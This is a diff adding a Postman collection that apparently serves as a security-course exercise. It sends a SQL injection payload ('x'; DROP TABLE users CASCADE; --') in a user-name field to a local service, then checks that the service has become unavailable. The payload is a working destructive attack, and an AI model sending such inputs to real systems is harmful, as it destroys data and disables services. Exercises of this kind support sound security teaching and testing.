@@ -1,0 +1,83 @@
+{
+	"info": {
+		"name": "M183_Availability_Attack",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Drop Table Attack",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"pm.test(\"Availability Attack - Drop Table\", function() {",
+							"    // The request might fail after dropping the table, which is expected",
+							"    // This is actually a sign that the attack worked",
+							"    pm.expect(true).to.be.true;",
+							"});"
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "PUT",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"user_id\": 1,\n    \"new_name\": \"x'; DROP TABLE users CASCADE; --\"\n}"
+				},
+				"url": {
+					"raw": "localhost:8000/users",
+					"host": [
+						"localhost"
+					],
+					"port": "8000",
+					"path": [
+						"users"
+					]
+				},
+				"description": "This attack will attempt to drop the users table, making the service unavailable"
+			}
+		},
+		{
+			"name": "Verify Attack Success",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"pm.test(\"Service should be unavailable\", function() {",
+							"    // If the attack worked, this request should fail",
+							"    // because the users table no longer exists",
+							"    pm.expect(pm.response.code).to.be.above(400);",
+							"});"
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "localhost:8000/users",
+					"host": [
+						"localhost"
+					],
+					"port": "8000",
+					"path": [
+						"users"
+					]
+				},
+				"description": "This request verifies if the attack was successful by checking if the users endpoint is still available"
+			}
+		}
+	]
+}
